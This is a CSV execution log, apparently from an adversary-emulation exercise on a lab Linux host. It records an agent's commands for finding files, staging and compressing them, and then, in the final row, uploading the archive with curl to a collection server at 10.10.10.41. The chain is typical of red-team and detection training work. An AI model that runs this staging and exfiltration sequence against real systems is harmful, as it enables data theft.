Time Ran,Ability Name,Agent,Host,pid,Link Command,Plaintext Command
2026-05-15T03:43:09Z,Create staging directory,zpdeim,safesoc-lnx-01,12897,mkdir -p staged && echo $PWD/staged,mkdir -p staged && echo $PWD/staged
2026-05-15T03:43:34Z,Find files,zpdeim,safesoc-lnx-01,12910,find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
2026-05-15T03:44:19Z,Find files,zpdeim,safesoc-lnx-01,12935,find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
2026-05-15T03:45:09Z,Find files,zpdeim,safesoc-lnx-01,12939,find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
2026-05-15T03:45:59Z,Stage sensitive files,zpdeim,safesoc-lnx-01,12948,cp /usr/share/sounds/sound-icons/percussion-50.wav /home/safesoc-lnx-01/Desktop/staged,cp /usr/share/sounds/sound-icons/percussion-50.wav /home/safesoc-lnx-01/Desktop/staged
2026-05-15T03:46:54Z,Stage sensitive files,zpdeim,safesoc-lnx-01,12968,cp /usr/share/ibus-table/data/coin9.wav /home/safesoc-lnx-01/Desktop/staged,cp /usr/share/ibus-table/data/coin9.wav /home/safesoc-lnx-01/Desktop/staged
2026-05-15T03:47:49Z,Stage sensitive files,zpdeim,safesoc-lnx-01,12986,cp /usr/share/perl/5.38.2/CPAN/Kwalify/distroprefs.yml /home/safesoc-lnx-01/Desktop/staged,cp /usr/share/perl/5.38.2/CPAN/Kwalify/distroprefs.yml /home/safesoc-lnx-01/Desktop/staged
2026-05-15T03:48:54Z,Compress staged directory,zpdeim,safesoc-lnx-01,13020,tar -P -zcf /home/safesoc-lnx-01/Desktop/staged.tar.gz /home/safesoc-lnx-01/Desktop/staged && echo /home/safesoc-lnx-01/Desktop/staged.tar.gz,tar -P -zcf /home/safesoc-lnx-01/Desktop/staged.tar.gz /home/safesoc-lnx-01/Desktop/staged && echo /home/safesoc-lnx-01/Desktop/staged.tar.gz
2026-05-15T03:49:54Z,Exfil staged directory,zpdeim,safesoc-lnx-01,13042,curl -F "data=@/home/safesoc-lnx-01/Desktop/staged.tar.gz" --header "X-Request-ID: `hostname`-zpdeim" http://10.10.10.41:8888/file/upload,curl -F "data=@/home/safesoc-lnx-01/Desktop/staged.tar.gz" --header "X-Request-ID: `hostname`-zpdeim" http://10.10.10.41:8888/file/upload
